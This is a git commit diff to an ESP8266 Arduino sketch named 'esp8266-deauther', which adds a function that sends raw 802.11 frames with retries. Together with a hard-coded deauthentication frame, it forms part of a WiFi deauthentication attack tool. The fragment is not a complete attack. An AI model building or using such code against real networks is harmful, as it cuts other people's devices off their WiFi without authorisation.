35f6dae96a8da2d3fd76e0950d346c8ac248c37e
krishpranav <krisna.pranav@gmail.com>
2021-04-18 18:23:24 +0530

    added sending packet function

--- esp8266-deauther.ino
+++ esp8266-deauther.ino
@@ -1,6 +1,7 @@
-
+// includes
 #include "ESP8266WiFi.h"
 
+// packet byte function
 uint8_t packet[26] = {
     0xC0, 0x00,
     0x00, 0x00,
@@ -10,3 +11,14 @@ uint8_t packet[26] = {
     0x00, 0x00,
     0x01, 0x00
 };
+
+// sending packets for a wifi function
+bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
+    wifi_set_channel(wifi_channel);
+    bool sent = false;
+    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
+
+    return sent;
+}
+
+
